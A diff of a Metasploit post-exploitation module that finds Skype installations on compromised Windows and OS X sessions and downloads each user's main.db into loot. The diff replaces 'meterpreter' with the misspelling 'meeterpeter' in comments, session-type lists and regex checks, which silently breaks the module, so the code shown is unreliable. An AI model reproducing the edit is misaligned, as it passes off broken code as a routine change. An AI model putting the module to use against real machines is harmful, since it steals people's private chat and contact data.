@@ -30,7 +30,7 @@ class Metasploit3 < Msf::Post
         'License'       => MSF_LICENSE,
         'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
         'Platform'      => %w{ osx win },
-        'SessionTypes'  => [ 'meterpreter', 'shell' ]
+        'SessionTypes'  => [ 'meeterpeter', 'shell' ]
       ))
     register_advanced_options(
       [
@@ -41,7 +41,7 @@ class Metasploit3 < Msf::Post
 
   # Run Method for when run command is issued
   def run
-    # syinfo is only on meterpreter sessions
+    # syinfo is only on meeterpeter sessions
     print_status("Running Skype enumeration against #{sysinfo['Computer']}") if not sysinfo.nil?
 
     # Ensure that SQLite3 gem is installed
@@ -53,7 +53,7 @@ class Metasploit3 < Msf::Post
     end
 
       if (session.platform =~ /java/) || (session.platform =~ /osx/)
-        # Make sure a Java Meterpreter on anything but OSX will exit
+        # Make sure a Java meeterpeter on anything but OSX will exit
         if session.platform =~ /java/ and sysinfo['OS'] !~ /Mac OS X/
           print_error("This session type and platform are not supported.")
           return
@@ -69,7 +69,7 @@ class Metasploit3 < Msf::Post
           end
         end
       elsif (session.platform =~ /win/ and session.type =~ /meter/)
-        # Iterate thru each user profile in a Windows System using Meterpreter Post API
+        # Iterate thru each user profile in a Windows System using meeterpeter Post API
         grab_user_profiles().each do |p|
           if check_skype(p['AppData'],p['UserName'])
             db_in_loot = download_db(p)
@@ -85,7 +85,7 @@ class Metasploit3 < Msf::Post
   # Check if Skype is installed. Returns true or false.
   def check_skype(path, user)
     dirs = []
-    if session.type =~ /meterpreter/
+    if session.type =~ /meeterpeter/
       session.fs.dir.foreach(path) do |d|
         dirs << d
       end
@@ -102,9 +102,9 @@ class Metasploit3 < Msf::Post
     return false
   end
 
-  # Download file using Meterpreter functionality and returns path in loot for the file
+  # Download file using meeterpeter functionality and returns path in loot for the file
   def download_db(profile)
-    if session.type =~ /meterpreter/
+    if session.type =~ /meeterpeter/
       if sysinfo['OS'] =~ /Mac OS X/
         file = session.fs.file.search("#{profile['dir']}/Library/Application Support/Skype/","main.db",true)
       else
@@ -122,7 +122,7 @@ class Metasploit3 < Msf::Post
       )
 
     file.each do |db|
-      if session.type =~ /meterpreter/
+      if session.type =~ /meeterpeter/
         maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
         print_status("Downloading #{maindb}")
         session.fs.file.download_file(file_loc,maindb)
